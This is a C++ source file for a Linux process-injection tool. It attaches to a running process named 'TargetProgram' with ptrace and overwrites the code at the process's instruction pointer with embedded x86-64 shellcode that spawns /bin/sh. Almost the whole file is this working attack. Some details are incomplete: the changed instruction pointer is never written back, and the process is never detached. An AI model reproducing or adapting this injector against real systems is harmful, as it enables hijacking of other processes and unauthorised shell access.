#include "resources.h"

using namespace std;

unsigned char shellcode[] = 
  "\x48\x31\xc0\x48\x89\xc2\x48\x89"
  "\xc6\x48\x8d\x3d\x04\x00\x00\x00"
  "\x04\x3b\x0f\x05\x2f\x62\x69\x6e"
  "\x2f\x73\x68\x00\xcc\x90\x90\x90";

size_t shellcodesz = sizeof(shellcode);

int inject(pid_t pid, unsigned char *sc, size_t sclen, void *dest); 

int main(void){
		pid_t ProcID;
		struct user_regs_struct registers;
		
		
		char buff[512];
		size_t dwSize = sizeof(buff);
		
		FILE * command = popen("pidof -s TargetProgram", "r");
		if(command == NULL){
				perror("error: ");
				return -1;
		}
		
		fgets(buff, dwSize, command);
		
		ProcID = strtoul(buff, NULL, 10);
		//ProcID = 6948;
		if(ProcID == 0){
				return -3;
		}
		pclose(command);
		
	    if ((ptrace(PTRACE_ATTACH, ProcID, NULL, NULL)) < 0) {
			perror("ptrace(ATTACH):");
			exit(1);
		}
		
		wait(0);
		
	    if ((ptrace(PTRACE_GETREGS, ProcID, NULL, &registers)) < 0) {
			perror("ptrace(GETREGS):");
			exit(1);
		}
		
		cout << "[+] Injecting Shellcode At " << (void *)(registers.rip) << endl;
		inject(ProcID, shellcode, shellcodesz, (void* )(registers.rip));
		
		registers.rip += 2; 
		cout << "[+] Setting Instuction Pointer to " << (void* )(registers.rip) << endl;
		
		cout << "[+] Operation Completed Successfully.\n";
		
		return 0;
}

int inject(pid_t pid, unsigned char *sc, size_t sclen, void *dest){
		int i;
		i = 0;
		
		uint32_t *shc = (uint32_t *)(sc);
		uint32_t *dst = (uint32_t *)(dest);
		
		for (i; i < sclen; i += 4, shc++, dst++){
				if ((ptrace(PTRACE_POKETEXT, pid, dst, *shc)) < 0) {
					perror("ptrace(POKETEXT):");
					return -1;
				}
		}
		
		return 0;
}
